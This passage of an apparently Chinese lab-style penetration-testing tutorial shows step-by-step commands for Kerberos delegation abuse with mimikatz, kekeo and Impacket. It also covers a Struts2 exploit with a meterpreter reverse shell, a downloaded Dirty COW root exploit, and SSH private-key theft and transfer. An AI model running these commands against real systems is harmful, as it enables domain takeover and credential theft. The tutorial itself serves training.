&amp;quot;exit&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kekeo &amp;quot;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god.god.org&amp;quot; &amp;quot;exit&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c. 导入票据到内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz kerberos::ptt TGS_Administrator@god.org@GOD.ORG_cifs~owa2010cn-god.god.org@GOD.ORG.kirbi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;d. 连接通讯域控&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell dir \\owa2010cn-god.god.org\c$&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;资源约束委派&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#资源约束委派&#34;&gt;#&lt;/a&gt; 资源约束委派&lt;/h4&gt;
&lt;p&gt;当多个计算机加入域时，可以使用同一域用户加入，如果有一台加入域的电脑被控，则其余使用该域用户加入域的主机都会被控。&lt;br&gt;
计算机脱域时，需要输入域控账户密码，并且重启。计算机加入域时，需要域控先添加域用户，计算机通过此域用户加入域控，并且重启。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取受害目标&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;有哪些域内计算机存在同一用户加入的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AdFind.exe -h 192.168.3.33 -b &amp;quot;DC=xiaodi,DC=local&amp;quot; -f &amp;quot;objectClass=computer&amp;quot; mS-DS-CreatorSID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看是否有相同sid值，有的话可以判断出有多用户使用该域用户加入了域&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;判断受害用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sid2user.exe \\192.168.3.3 5 21 1695257952 3088263962 2055235443 1104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;普通域用户设置用户名密码，为域控增加机器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;项目地址：https://github.com/Kevin-Robertson/Powermad&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Set-ExecutionPolicy Bypass -Scope Process&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Import-Module .\Powermad.ps1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;New-MachineAccount -MachineAccount serviceA -Password $(ConvertTo-SecureString &amp;quot;123456&amp;quot; -AsPlainText -Force)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取新加的计算器的sid：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;工具地址：https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Import-Module .\PowerView.ps1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Get-NetComputer serviceA -Properties objectsid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;S-1-5-21-1695257952-3088263962-2055235443-1107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置修改属性&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import-module .\powerview.ps1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &lt;span class=&#34;string&#34;&gt;&amp;quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1695257 952-3088263962-2055235443-1107)&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;SDBytes = New-Object byte[] (&lt;span class=&#34;variable&#34;&gt;$SD&lt;/span&gt;.BinaryLength)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;SD.GetBinaryForm(&lt;span class=&#34;variable&#34;&gt;$SDBytes&lt;/span&gt;, 0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改原主机data用户的相关属性&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Get-DomainComputer DATA| Set-DomainObject -Set @&amp;#123;&amp;#x27;msds-allowedtoactonbehalfofotheridentity&amp;#x27;=$SDBytes&amp;#125; -Verbose&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;验证修改是否成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Get-DomainComputer DATA -Properties msds-allowedtoactonbehalfofotheridentity&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;清除修改设置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Set-DomainObject DATA -Clear &amp;#x27;msds-allowedtoactonbehalfofotheridentity&amp;#x27; -Verbose&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;建立代理连接目标获取票据：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;需要修改本地hosts文件，将以下两个域名从本地hosts文件中解析&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python getST.py -dc-ip 192.168.3.33 xiaodi.local/serviceA\$:123456 -spn cifs/data.xiaodi.local -impersonate administrator&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;对票据进行操作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;导入票据到内存：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz kerberos::ptc administrator.ccache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;连接利用票据：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir \\data.xiaodi.local\c$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python psexec.py -k xiaodi.local/administrator@data.xiaodi.local -no-pass&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;横向linux&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#横向linux&#34;&gt;#&lt;/a&gt; 横向 linux&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/Safe/image-007.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;（ 1 ）Web DMZ 权限获取&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;信息收集：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nmap 172.16.250.0/24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;根据确定的 80 上的opensms10.3搜索漏洞利用方法：/struts2-showcase&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用msf进行st 2 漏洞利用：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/http/struts2_content_type_ognl&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload linux/x64/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 172.16.250.10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 2 ）脏牛漏洞权限提升至 root（会把服务器打崩）&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载exp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl https://raw.githubusercontent.com/sqlnetcat/dirtycow-mem/master/dirtycow-mem.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;upload /root/dirtycow-mem.c /tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./dirtycow-mem&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;稳定脏牛漏洞带来对系统的危害：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo 0 &amp;gt; /proc/sys/vm/dirty_writeback_centisecs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo 1 &amp;gt; /proc/sys/kernel/panic &amp;amp;&amp;amp; echo 1 &amp;gt; /proc/sys/kernel/panic_on_oo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps &amp;amp;&amp;amp; echo 1 &amp;gt; /proc/sys/kernel/panic_on_unrecovered_nmi &amp;amp;&amp;amp; echo 1 &amp;gt; /proc/sys/kernel/panic_on_io_nmi &amp;amp;&amp;amp; echo 1 &amp;gt; /proc/sys/kernel/panic_on_warn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 3 ）linux 信息收集：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;找到敏感文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;发现存在172.16.250.30 8080的网站，但只允许跳板机访问，可以用ssh做代理转发流量&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;找到ssh的私钥文件可以连接到jenkins机器，进行远程登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/.bash_history&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp ~/.ssh/id_rsa /tmp/id_rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 777 id_rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;download /tmp/id_rsa /root/id_rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 0600 id_rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh -i id_rsa root@172.16.250.30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat - tunlp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 4 ）msf 设置代理将端口转发&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use auxiliary/server/server/socks_proxy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set srvport 2222&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;conf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jobs 查看当前工作是否正常&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim /etc/proxychains4.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dynamic_chain 只需保证一个代理正确即可使用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;strict_chain 需保证每一个代理都准确&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 5 ）Jenkins DMZ 后台存储的密钥传输&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;本地用nc接受文件：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvp 1234 &amp;gt; 